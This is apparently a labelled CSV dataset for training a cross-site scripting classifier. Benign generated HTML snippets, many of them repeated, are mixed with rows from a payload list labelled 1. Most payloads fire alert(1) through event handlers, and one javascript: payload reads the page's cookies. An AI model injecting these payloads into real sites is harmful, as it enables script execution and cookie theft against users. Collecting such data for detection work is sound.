text,label,source,length,timestamp
"<footer onmouseup=""alert(1)"">test</footer>",1,payloadbox,42,2026-03-01T13:13:37.388686
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",1,payloadbox,99,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.412991
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">",1,payloadbox,61,2026-03-01T13:13:37.396686
<svg><ins onload=alert(1)></ins>,1,payloadbox,32,2026-03-01T13:13:37.394683
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",1,payloadbox,59,2026-03-01T13:13:37.389686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
<span class='class-1104'>Services</span>,0,generated,40,2026-03-01T13:13:37.399984
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
"<rtc onmouseenter=""alert(1)"">test</rtc>",1,payloadbox,39,2026-03-01T13:13:37.391686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405991
"<noscript onkeypress=""alert(1)"" contenteditable>test</noscript>",1,payloadbox,63,2026-03-01T13:13:37.390697
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",1,payloadbox,53,2026-03-01T13:13:37.385678
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",1,payloadbox,107,2026-03-01T13:13:37.387778
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,payloadbox,57,2026-03-01T13:13:37.385678
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",1,payloadbox,50,2026-03-01T13:13:37.389686
<span class='class-3604'>Services</span>,0,generated,40,2026-03-01T13:13:37.406989
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.411988
<p>About</p>,0,generated,12,2026-03-01T13:13:37.401989
<p>About</p>,0,generated,12,2026-03-01T13:13:37.412991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
<span class='class-5574'>Services</span>,0,generated,40,2026-03-01T13:13:37.412991
<x </onxxx=1,1,payloadbox,12,2026-03-01T13:13:37.385678
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.414992
"<u oncontextmenu=""alert(1)"">test</u>",1,payloadbox,36,2026-03-01T13:13:37.395688
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",1,payloadbox,109,2026-03-01T13:13:37.392697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
"<div id=""134""><xmp>",1,payloadbox,19,2026-03-01T13:13:37.396686
"<meter oncopy=""alert(1)"" contenteditable>test</meter>",1,payloadbox,53,2026-03-01T13:13:37.390697
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",1,payloadbox,52,2026-03-01T13:13:37.390697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.409991
"<figcaption onmousemove=""alert(1)"">test</figcaption>",1,payloadbox,52,2026-03-01T13:13:37.388686
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1,payloadbox,57,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.408990
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.396686
"<div id=""99"">XXX<style>",1,payloadbox,23,2026-03-01T13:13:37.396686
<svg><tr onload=alert(1)></tr>,1,payloadbox,30,2026-03-01T13:13:37.394683
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",1,payloadbox,106,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.396686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403996
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.408990
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
"<data onmouseout=""alert(1)"">test</data>",1,payloadbox,39,2026-03-01T13:13:37.387778
<image/src/onerror=prompt(8)>,1,payloadbox,29,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.409991
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",1,payloadbox,59,2026-03-01T13:13:37.395688
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",1,payloadbox,52,2026-03-01T13:13:37.389686
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",1,payloadbox,59,2026-03-01T13:13:37.390697
<span class='class-6204'>Services</span>,0,generated,40,2026-03-01T13:13:37.414992
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.412991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,1,payloadbox,46,2026-03-01T13:13:37.395688
<body onbeforeprint=alert(1)>,1,payloadbox,29,2026-03-01T13:13:37.386686
"<body onmousedown=""alert(1)"">test</body>",1,payloadbox,40,2026-03-01T13:13:37.386686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.408990
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,1,payloadbox,48,2026-03-01T13:13:37.390697
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",1,payloadbox,69,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405009
"<ins onmouseup=""alert(1)"">test</ins>",1,payloadbox,36,2026-03-01T13:13:37.389686
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strong>",1,payloadbox,182,2026-03-01T13:13:37.393697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403996
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",1,payloadbox,58,2026-03-01T13:13:37.391686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.399984
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.408990
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",1,payloadbox,72,2026-03-01T13:13:37.391686
<svg onload=alert(1)>,1,payloadbox,21,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.401989
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.415994
"<optgroup draggable=""true"" ondrag=""alert(1)"">test</optgroup>",1,payloadbox,60,2026-03-01T13:13:37.390697
"<img onclick=""alert(1)"">test</img>",1,payloadbox,34,2026-03-01T13:13:37.389686
"<object onbeforecopy=""alert(1)"" contenteditable>test</object>",1,payloadbox,61,2026-03-01T13:13:37.390697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,1,payloadbox,54,2026-03-01T13:13:37.390697
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",1,payloadbox,132,2026-03-01T13:13:37.392697
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",1,payloadbox,178,2026-03-01T13:13:37.393697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",1,payloadbox,62,2026-03-01T13:13:37.391686
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",1,payloadbox,101,2026-03-01T13:13:37.388686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1,payloadbox,59,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.397682
<img src/onerror=alert(1)>,1,payloadbox,26,2026-03-01T13:13:37.389686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.413993
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.407992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.412991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.413993
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",1,payloadbox,134,2026-03-01T13:13:37.392697
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.406989
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403996
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.394683
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",1,payloadbox,61,2026-03-01T13:13:37.387778
"<source onmouseleave=""alert(1)"">test</source>",1,payloadbox,45,2026-03-01T13:13:37.391686
<span class='class-514'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",1,payloadbox,51,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.403007
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.411988
"<element ondblclick=""alert(1)"">test</element>",1,payloadbox,45,2026-03-01T13:13:37.388686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.401989
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1,payloadbox,49,2026-03-01T13:13:37.385678
"<samp onmouseenter=""alert(1)"">test</samp>",1,payloadbox,41,2026-03-01T13:13:37.391686
<marquee onstart=alert(1)>XSS</marquee>,1,payloadbox,39,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.406989
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.396686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.406989
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",1,payloadbox,56,2026-03-01T13:13:37.392697
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,1,payloadbox,71,2026-03-01T13:13:37.391686
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",1,payloadbox,56,2026-03-01T13:13:37.386686
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",1,payloadbox,117,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.412991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.407992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",1,payloadbox,162,2026-03-01T13:13:37.392697
<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,1,payloadbox,145,2026-03-01T13:13:37.396686
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",1,payloadbox,59,2026-03-01T13:13:37.390697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.406989
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",1,payloadbox,55,2026-03-01T13:13:37.386686
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",1,payloadbox,59,2026-03-01T13:13:37.391686
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",1,payloadbox,56,2026-03-01T13:13:37.389686
"<IMG SRC=""livescript:[code]"">",1,payloadbox,29,2026-03-01T13:13:37.396686
